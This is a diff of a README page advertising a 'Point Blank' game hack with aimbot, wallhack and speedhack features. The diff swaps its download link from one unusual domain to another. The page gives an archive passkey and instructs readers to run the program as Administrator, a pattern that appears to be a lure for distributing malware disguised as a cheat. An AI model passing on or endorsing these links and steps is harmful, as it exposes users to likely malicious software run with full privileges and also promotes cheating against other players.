@@ -6,7 +6,7 @@ Point Blank hack with external menu, aimbot, ESP, wallhack, speedhack, and more 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappsdown.pro/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -72,7 +72,7 @@ Based on popular mods like **PB Cheat**, **Point Blank Hack**, and **QOLMod**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitappsdown.pro/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Point Blank.
 4. Run the hack **as Administrator**.
